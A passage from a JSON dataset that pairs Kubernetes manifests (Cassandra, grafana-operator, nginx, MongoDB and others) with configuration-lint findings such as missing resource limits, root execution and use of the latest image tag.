    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:akri protocol:http])"
  },
  {
    "id": "9291",
    "manifest_path": "data/manifests/the_stack_sample/sample_3519.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    app: cassandra\n  name: cassandra\nspec:\n  containers:\n  - args:\n    - /run.sh\n    resources:\n      limits:\n        cpu: '0.1'\n    image: gcr.io/google_containers/cassandra:v7\n    name: cassandra\n    ports:\n    - name: cql\n      containerPort: 9042\n    - name: thrift\n      containerPort: 9160\n    volumeMounts:\n    - name: data\n      mountPath: /cassandra_data\n    env:\n    - name: MAX_HEAP_SIZE\n      value: 512M\n    - name: HEAP_NEWSIZE\n      value: 100M\n    - name: POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n  volumes:\n  - name: data\n    emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cassandra\" does not have a read-only root file system"
  },
  {
    "id": "9292",
    "manifest_path": "data/manifests/the_stack_sample/sample_3519.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    app: cassandra\n  name: cassandra\nspec:\n  containers:\n  - args:\n    - /run.sh\n    resources:\n      limits:\n        cpu: '0.1'\n    image: gcr.io/google_containers/cassandra:v7\n    name: cassandra\n    ports:\n    - name: cql\n      containerPort: 9042\n    - name: thrift\n      containerPort: 9160\n    volumeMounts:\n    - name: data\n      mountPath: /cassandra_data\n    env:\n    - name: MAX_HEAP_SIZE\n      value: 512M\n    - name: HEAP_NEWSIZE\n      value: 100M\n    - name: POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n  volumes:\n  - name: data\n    emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cassandra\" is not set to runAsNonRoot"
  },
  {
    "id": "9293",
    "manifest_path": "data/manifests/the_stack_sample/sample_3519.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    app: cassandra\n  name: cassandra\nspec:\n  containers:\n  - args:\n    - /run.sh\n    resources:\n      limits:\n        cpu: '0.1'\n    image: gcr.io/google_containers/cassandra:v7\n    name: cassandra\n    ports:\n    - name: cql\n      containerPort: 9042\n    - name: thrift\n      containerPort: 9160\n    volumeMounts:\n    - name: data\n      mountPath: /cassandra_data\n    env:\n    - name: MAX_HEAP_SIZE\n      value: 512M\n    - name: HEAP_NEWSIZE\n      value: 100M\n    - name: POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n  volumes:\n  - name: data\n    emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cassandra\" has cpu request 0"
  },
  {
    "id": "9294",
    "manifest_path": "data/manifests/the_stack_sample/sample_3519.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    app: cassandra\n  name: cassandra\nspec:\n  containers:\n  - args:\n    - /run.sh\n    resources:\n      limits:\n        cpu: '0.1'\n    image: gcr.io/google_containers/cassandra:v7\n    name: cassandra\n    ports:\n    - name: cql\n      containerPort: 9042\n    - name: thrift\n      containerPort: 9160\n    volumeMounts:\n    - name: data\n      mountPath: /cassandra_data\n    env:\n    - name: MAX_HEAP_SIZE\n      value: 512M\n    - name: HEAP_NEWSIZE\n      value: 100M\n    - name: POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n  volumes:\n  - name: data\n    emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cassandra\" has memory limit 0"
  },
  {
    "id": "9295",
    "manifest_path": "data/manifests/the_stack_sample/sample_3521.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: grafana-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: grafana-operator\n  template:\n    metadata:\n      labels:\n        name: grafana-operator\n    spec:\n      serviceAccountName: grafana-operator\n      containers:\n      - name: grafana-operator\n        image: quay.io/integreatly/grafana-operator:v3.10.1\n        ports:\n        - containerPort: 60000\n          name: metrics\n        command:\n        - grafana-operator\n        imagePullPolicy: Always\n        env:\n        - name: TEMPLATE_PATH\n          value: /usr/local/bin/templates\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: grafana-operator\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"grafana-operator\" does not have a read-only root file system"
  },
  {
    "id": "9296",
    "manifest_path": "data/manifests/the_stack_sample/sample_3521.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: grafana-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: grafana-operator\n  template:\n    metadata:\n      labels:\n        name: grafana-operator\n    spec:\n      serviceAccountName: grafana-operator\n      containers:\n      - name: grafana-operator\n        image: quay.io/integreatly/grafana-operator:v3.10.1\n        ports:\n        - containerPort: 60000\n          name: metrics\n        command:\n        - grafana-operator\n        imagePullPolicy: Always\n        env:\n        - name: TEMPLATE_PATH\n          value: /usr/local/bin/templates\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: grafana-operator\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"grafana-operator\" not found"
  },
  {
    "id": "9297",
    "manifest_path": "data/manifests/the_stack_sample/sample_3521.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: grafana-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: grafana-operator\n  template:\n    metadata:\n      labels:\n        name: grafana-operator\n    spec:\n      serviceAccountName: grafana-operator\n      containers:\n      - name: grafana-operator\n        image: quay.io/integreatly/grafana-operator:v3.10.1\n        ports:\n        - containerPort: 60000\n          name: metrics\n        command:\n        - grafana-operator\n        imagePullPolicy: Always\n        env:\n        - name: TEMPLATE_PATH\n          value: /usr/local/bin/templates\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: grafana-operator\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"grafana-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "9298",
    "manifest_path": "data/manifests/the_stack_sample/sample_3521.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: grafana-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: grafana-operator\n  template:\n    metadata:\n      labels:\n        name: grafana-operator\n    spec:\n      serviceAccountName: grafana-operator\n      containers:\n      - name: grafana-operator\n        image: quay.io/integreatly/grafana-operator:v3.10.1\n        ports:\n        - containerPort: 60000\n          name: metrics\n        command:\n        - grafana-operator\n        imagePullPolicy: Always\n        env:\n        - name: TEMPLATE_PATH\n          value: /usr/local/bin/templates\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: grafana-operator\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"grafana-operator\" has cpu request 0"
  },
  {
    "id": "9299",
    "manifest_path": "data/manifests/the_stack_sample/sample_3521.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: grafana-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: grafana-operator\n  template:\n    metadata:\n      labels:\n        name: grafana-operator\n    spec:\n      serviceAccountName: grafana-operator\n      containers:\n      - name: grafana-operator\n        image: quay.io/integreatly/grafana-operator:v3.10.1\n        ports:\n        - containerPort: 60000\n          name: metrics\n        command:\n        - grafana-operator\n        imagePullPolicy: Always\n        env:\n        - name: TEMPLATE_PATH\n          value: /usr/local/bin/templates\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: grafana-operator\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"grafana-operator\" has memory limit 0"
  },
  {
    "id": "9300",
    "manifest_path": "data/manifests/the_stack_sample/sample_3522.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: community\n  labels:\n    app: community\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: community\n  template:\n    metadata:\n      labels:\n        app: community\n    spec:\n      containers:\n      - name: community\n        image: quay.io/danielmunro/otto-community-service:latest\n        resources:\n          requests:\n            ephemeral-storage: 500Mi\n          limits:\n            ephemeral-storage: 500Mi\n        ports:\n        - containerPort: 8081\n        env:\n        - name: USER_SERVICE_HOST\n          value: $(USER_SERVICE_SERVICE_HOST):8080\n        - name: PG_HOST\n          value: $(DB_SERVICE_HOST):5432\n        - name: SESSION_KEY\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: session_key\n        - name: PG_USER\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_user\n        - name: PG_PORT\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_port\n        - name: PG_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_password\n        - name: PG_DBNAME\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_name\n        - name: KAFKA_HOST\n          valueFrom:\n            secretKeyRef:\n              name: image-config\n              key: kafka_host\n        - name: PG_HOST\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_host\n",
    "policy_id": "duplicate-env-var",
    "violation_text": "Duplicate environment variable PG_HOST in container \"community\" found"
  },
  {
    "id": "9301",
    "manifest_path": "data/manifests/the_stack_sample/sample_3522.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: community\n  labels:\n    app: community\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: community\n  template:\n    metadata:\n      labels:\n        app: community\n    spec:\n      containers:\n      - name: community\n        image: quay.io/danielmunro/otto-community-service:latest\n        resources:\n          requests:\n            ephemeral-storage: 500Mi\n          limits:\n            ephemeral-storage: 500Mi\n        ports:\n        - containerPort: 8081\n        env:\n        - name: USER_SERVICE_HOST\n          value: $(USER_SERVICE_SERVICE_HOST):8080\n        - name: PG_HOST\n          value: $(DB_SERVICE_HOST):5432\n        - name: SESSION_KEY\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: session_key\n        - name: PG_USER\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_user\n        - name: PG_PORT\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_port\n        - name: PG_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_password\n        - name: PG_DBNAME\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_name\n        - name: KAFKA_HOST\n          valueFrom:\n            secretKeyRef:\n              name: image-config\n              key: kafka_host\n        - name: PG_HOST\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_host\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"community\" is using an invalid container image, \"quay.io/danielmunro/otto-community-service:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9302",
    "manifest_path": "data/manifests/the_stack_sample/sample_3522.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: community\n  labels:\n    app: community\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: community\n  template:\n    metadata:\n      labels:\n        app: community\n    spec:\n      containers:\n      - name: community\n        image: quay.io/danielmunro/otto-community-service:latest\n        resources:\n          requests:\n            ephemeral-storage: 500Mi\n          limits:\n            ephemeral-storage: 500Mi\n        ports:\n        - containerPort: 8081\n        env:\n        - name: USER_SERVICE_HOST\n          value: $(USER_SERVICE_SERVICE_HOST):8080\n        - name: PG_HOST\n          value: $(DB_SERVICE_HOST):5432\n        - name: SESSION_KEY\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: session_key\n        - name: PG_USER\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_user\n        - name: PG_PORT\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_port\n        - name: PG_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_password\n        - name: PG_DBNAME\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_name\n        - name: KAFKA_HOST\n          valueFrom:\n            secretKeyRef:\n              name: image-config\n              key: kafka_host\n        - name: PG_HOST\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_host\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"community\" does not have a read-only root file system"
  },
  {
    "id": "9303",
    "manifest_path": "data/manifests/the_stack_sample/sample_3522.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: community\n  labels:\n    app: community\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: community\n  template:\n    metadata:\n      labels:\n        app: community\n    spec:\n      containers:\n      - name: community\n        image: quay.io/danielmunro/otto-community-service:latest\n        resources:\n          requests:\n            ephemeral-storage: 500Mi\n          limits:\n            ephemeral-storage: 500Mi\n        ports:\n        - containerPort: 8081\n        env:\n        - name: USER_SERVICE_HOST\n          value: $(USER_SERVICE_SERVICE_HOST):8080\n        - name: PG_HOST\n          value: $(DB_SERVICE_HOST):5432\n        - name: SESSION_KEY\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: session_key\n        - name: PG_USER\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_user\n        - name: PG_PORT\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_port\n        - name: PG_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_password\n        - name: PG_DBNAME\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_name\n        - name: KAFKA_HOST\n          valueFrom:\n            secretKeyRef:\n              name: image-config\n              key: kafka_host\n        - name: PG_HOST\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_host\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"community\" is not set to runAsNonRoot"
  },
  {
    "id": "9304",
    "manifest_path": "data/manifests/the_stack_sample/sample_3522.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: community\n  labels:\n    app: community\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: community\n  template:\n    metadata:\n      labels:\n        app: community\n    spec:\n      containers:\n      - name: community\n        image: quay.io/danielmunro/otto-community-service:latest\n        resources:\n          requests:\n            ephemeral-storage: 500Mi\n          limits:\n            ephemeral-storage: 500Mi\n        ports:\n        - containerPort: 8081\n        env:\n        - name: USER_SERVICE_HOST\n          value: $(USER_SERVICE_SERVICE_HOST):8080\n        - name: PG_HOST\n          value: $(DB_SERVICE_HOST):5432\n        - name: SESSION_KEY\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: session_key\n        - name: PG_USER\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_user\n        - name: PG_PORT\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_port\n        - name: PG_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_password\n        - name: PG_DBNAME\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_name\n        - name: KAFKA_HOST\n          valueFrom:\n            secretKeyRef:\n              name: image-config\n              key: kafka_host\n        - name: PG_HOST\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_host\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"community\" has cpu request 0"
  },
  {
    "id": "9305",
    "manifest_path": "data/manifests/the_stack_sample/sample_3522.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: community\n  labels:\n    app: community\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: community\n  template:\n    metadata:\n      labels:\n        app: community\n    spec:\n      containers:\n      - name: community\n        image: quay.io/danielmunro/otto-community-service:latest\n        resources:\n          requests:\n            ephemeral-storage: 500Mi\n          limits:\n            ephemeral-storage: 500Mi\n        ports:\n        - containerPort: 8081\n        env:\n        - name: USER_SERVICE_HOST\n          value: $(USER_SERVICE_SERVICE_HOST):8080\n        - name: PG_HOST\n          value: $(DB_SERVICE_HOST):5432\n        - name: SESSION_KEY\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: session_key\n        - name: PG_USER\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_user\n        - name: PG_PORT\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_port\n        - name: PG_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_password\n        - name: PG_DBNAME\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_name\n        - name: KAFKA_HOST\n          valueFrom:\n            secretKeyRef:\n              name: image-config\n              key: kafka_host\n        - name: PG_HOST\n          valueFrom:\n            secretKeyRef:\n              name: community-config\n              key: db_host\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"community\" has memory limit 0"
  },
  {
    "id": "9306",
    "manifest_path": "data/manifests/the_stack_sample/sample_3523.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    app: myapp\n  annotations:\n    inject-certs: enabled\n  name: mypod\nspec:\n  containers:\n  - image: nginx:latest\n    name: nginx\n    volumeMounts:\n    - name: etc-ssl-certs\n      mountPath: /etc/ssl/certs\n  volumes:\n  - name: etc-ssl-certs\n    configMap:\n      name: ca-pemstore\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9307",
    "manifest_path": "data/manifests/the_stack_sample/sample_3523.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    app: myapp\n  annotations:\n    inject-certs: enabled\n  name: mypod\nspec:\n  containers:\n  - image: nginx:latest\n    name: nginx\n    volumeMounts:\n    - name: etc-ssl-certs\n      mountPath: /etc/ssl/certs\n  volumes:\n  - name: etc-ssl-certs\n    configMap:\n      name: ca-pemstore\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "9308",
    "manifest_path": "data/manifests/the_stack_sample/sample_3523.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    app: myapp\n  annotations:\n    inject-certs: enabled\n  name: mypod\nspec:\n  containers:\n  - image: nginx:latest\n    name: nginx\n    volumeMounts:\n    - name: etc-ssl-certs\n      mountPath: /etc/ssl/certs\n  volumes:\n  - name: etc-ssl-certs\n    configMap:\n      name: ca-pemstore\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "9309",
    "manifest_path": "data/manifests/the_stack_sample/sample_3523.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    app: myapp\n  annotations:\n    inject-certs: enabled\n  name: mypod\nspec:\n  containers:\n  - image: nginx:latest\n    name: nginx\n    volumeMounts:\n    - name: etc-ssl-certs\n      mountPath: /etc/ssl/certs\n  volumes:\n  - name: etc-ssl-certs\n    configMap:\n      name: ca-pemstore\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "9310",
    "manifest_path": "data/manifests/the_stack_sample/sample_3523.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    app: myapp\n  annotations:\n    inject-certs: enabled\n  name: mypod\nspec:\n  containers:\n  - image: nginx:latest\n    name: nginx\n    volumeMounts:\n    - name: etc-ssl-certs\n      mountPath: /etc/ssl/certs\n  volumes:\n  - name: etc-ssl-certs\n    configMap:\n      name: ca-pemstore\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "9311",
    "manifest_path": "data/manifests/the_stack_sample/sample_3524.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    name: web\n  name: web-controller\nspec:\n  replicas: 2\n  selector:\n    name: web\n  template:\n    metadata:\n      labels:\n        name: web\n    spec:\n      containers:\n      - image: node:0.10.40\n        command:\n        - /bin/sh\n        - -c\n        args:\n        - cd /home && git clone https://github.com/hustbill/nodesjs-mongodb.git demo\n          && cd demo/TeamDB/ && npm install && sed -i -- 's/localhost/mongo/g' app.js\n          && node app.js\n        name: web\n        ports:\n        - containerPort: 3000\n          name: http-server\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9312",
    "manifest_path": "data/manifests/the_stack_sample/sample_3524.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    name: web\n  name: web-controller\nspec:\n  replicas: 2\n  selector:\n    name: web\n  template:\n    metadata:\n      labels:\n        name: web\n    spec:\n      containers:\n      - image: node:0.10.40\n        command:\n        - /bin/sh\n        - -c\n        args:\n        - cd /home && git clone https://github.com/hustbill/nodesjs-mongodb.git demo\n          && cd demo/TeamDB/ && npm install && sed -i -- 's/localhost/mongo/g' app.js\n          && node app.js\n        name: web\n        ports:\n        - containerPort: 3000\n          name: http-server\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"web\" does not have a read-only root file system"
  },
  {
    "id": "9313",
    "manifest_path": "data/manifests/the_stack_sample/sample_3524.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    name: web\n  name: web-controller\nspec:\n  replicas: 2\n  selector:\n    name: web\n  template:\n    metadata:\n      labels:\n        name: web\n    spec:\n      containers:\n      - image: node:0.10.40\n        command:\n        - /bin/sh\n        - -c\n        args:\n        - cd /home && git clone https://github.com/hustbill/nodesjs-mongodb.git demo\n          && cd demo/TeamDB/ && npm install && sed -i -- 's/localhost/mongo/g' app.js\n          && node app.js\n        name: web\n        ports:\n        - containerPort: 3000\n          name: http-server\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"web\" is not set to runAsNonRoot"
  },
  {
    "id": "9314",
    "manifest_path": "data/manifests/the_stack_sample/sample_3524.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    name: web\n  name: web-controller\nspec:\n  replicas: 2\n  selector:\n    name: web\n  template:\n    metadata:\n      labels:\n        name: web\n    spec:\n      containers:\n      - image: node:0.10.40\n        command:\n        - /bin/sh\n        - -c\n        args:\n        - cd /home && git clone https://github.com/hustbill/nodesjs-mongodb.git demo\n          && cd demo/TeamDB/ && npm install && sed -i -- 's/localhost/mongo/g' app.js\n          && node app.js\n        name: web\n        ports:\n        - containerPort: 3000\n          name: http-server\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"web\" has cpu request 0"
  },
  {
    "id": "9315",
    "manifest_path": "data/manifests/the_stack_sample/sample_3524.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    name: web\n  name: web-controller\nspec:\n  replicas: 2\n  selector:\n    name: web\n  template:\n    metadata:\n      labels:\n        name: web\n    spec:\n      containers:\n      - image: node:0.10.40\n        command:\n        - /bin/sh\n        - -c\n        args:\n        - cd /home && git clone https://github.com/hustbill/nodesjs-mongodb.git demo\n          && cd demo/TeamDB/ && npm install && sed -i -- 's/localhost/mongo/g' app.js\n          && node app.js\n        name: web\n        ports:\n        - containerPort: 3000\n          name: http-server\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"web\" has memory limit 0"
  },
  {
    "id": "9316",
    "manifest_path": "data/manifests/the_stack_sample/sample_3525.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: reviews\n  annotations:\n    skupper.io/proxy: http\n  labels:\n    app: reviews\n    version: v3\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: reviews\n  template:\n    metadata:\n      labels:\n        app: reviews\n        version: v3\n    spec:\n      containers:\n      - name: reviews\n        image: docker.io/maistra/examples-bookinfo-reviews-v3:0.12.0\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"reviews\" does not have a read-only root file system"
  },
  {
    "id": "9317",
    "manifest_path": "data/manifests/the_stack_sample/sample_3525.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: reviews\n  annotations:\n    skupper.io/proxy: http\n  labels:\n    app: reviews\n    version: v3\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: reviews\n  template:\n    metadata:\n      labels:\n        app: reviews\n        version: v3\n    spec:\n      containers:\n      - name: reviews\n        image: docker.io/maistra/examples-bookinfo-reviews-v3:0.12.0\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"reviews\" is not set to runAsNonRoot"
  },
  {
    "id": "9318",
    "manifest_path": "data/manifests/the_stack_sample/sample_3525.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: reviews\n  annotations:\n    skupper.io/proxy: http\n  labels:\n    app: reviews\n    version: v3\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: reviews\n  template:\n    metadata:\n      labels:\n        app: reviews\n        version: v3\n    spec:\n      containers:\n      - name: reviews\n        image: docker.io/maistra/examples-bookinfo-reviews-v3:0.12.0\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9080\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"reviews\" has cpu request 0"
  },
  {
    "id": "9319",
    "manifest_path": "data/manifests/the_stack_sample/sample_3525.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: reviews\n  annotations:\n    skupper.io/proxy: http\n  labels:\n    app: reviews\n    version: v3\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: reviews\n  template:\n    metadata:\n      labels:\n        app: reviews\n        version: v3\n    spec:\n      containers:\n      - name: reviews\n        image: docker.io/maistra/examples-bookinfo-reviews-v3:0.12.0\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9080\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"reviews\" has memory limit 0"
  },
  {
    "id": "9320",
    "manifest_path": "data/manifests/the_stack_sample/sample_3526.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: cloudorbit21\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 443\n  selector:\n    app: cloudorbit21\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:cloudorbit21])"
  },
  {
    "id": "9321",
    "manifest_path": "data/manifests/the_stack_sample/sample_3529.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: mongo\nspec:\n  selector:\n    matchLabels:\n      app: mongo\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: mongo\n    spec:\n      containers:\n      - name: mongo\n        image: mongo\n        command:\n        - mongod\n        - --bind_ip_all\n        - --replSet\n        - rs0\n        ports:\n        - containerPort: 27017\n        volumeMounts:\n        - name: mongo-volume\n          mountPath: /data/db\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"mongo\" is using an invalid container image, \"mongo\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9322",
    "manifest_path": "data/manifests/the_stack_sample/sample_3529.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: mongo\nspec:\n  selector:\n    matchLabels:\n      app: mongo\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: mongo\n    spec:\n      containers:\n      - name: mongo\n        image: mongo\n        command:\n        - mongod\n        - --bind_ip_all\n        - --replSet\n        - rs0\n        ports:\n        - containerPort: 27017\n        volumeMounts:\n        - name: mongo-volume\n          mountPath: /data/db\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9323",
    "manifest_path": "data/manifests/the_stack_sample/sample_3529.yaml",
